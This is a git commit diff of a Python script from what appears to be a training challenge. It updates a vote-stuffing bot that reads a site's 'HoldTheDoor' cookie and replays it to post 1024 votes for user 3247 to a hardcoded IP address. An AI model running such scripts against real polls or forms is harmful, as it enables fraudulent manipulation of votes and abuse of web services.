914e904258d8175bcb56938a419dcdfb28516304
mahmoud94ha <91053929+mahmoud94ha@users.noreply.github.com>
2022-03-09 23:56:46 +0100

    Update level_0.py

--- level_0/level_0.py
+++ level_0/level_0.py
@@ -1,21 +1,24 @@
 #!/usr/bin/python3
-"""script that votes 1024 times for 3247 user
-"""
-
 import requests
 failures = 0
 success = 0
-
-print("Starting program...")
+print("Starting voting...")
 
 URL = 'http://158.69.76.135/level0.php'
 user_data = {
     'id': '3247',
     'holdthedoor': 'Submit',
+    'key': '0'
+}
+cookies = {
+    'HoldTheDoor': '0'
 }
 
-for _ in range(2):
-    r = requests.post(URL, data=user_data)
+
+r = requests.get(URL)
+for _ in range(1024):
+    cookies['holdthedoor'] = r.cookies['HoldTheDoor']
+    r = requests.post(URL, data=user_data, cookies=cookies)
     if (r.status_code == 200):
         success += 1
     else:
@@ -23,3 +26,4 @@ for _ in range(2):
 
 print("you voted {} times for {} user".format(success, user_data['id']))
 print("Successes → {}\nFailures → {}".format(success, failures))
+#104
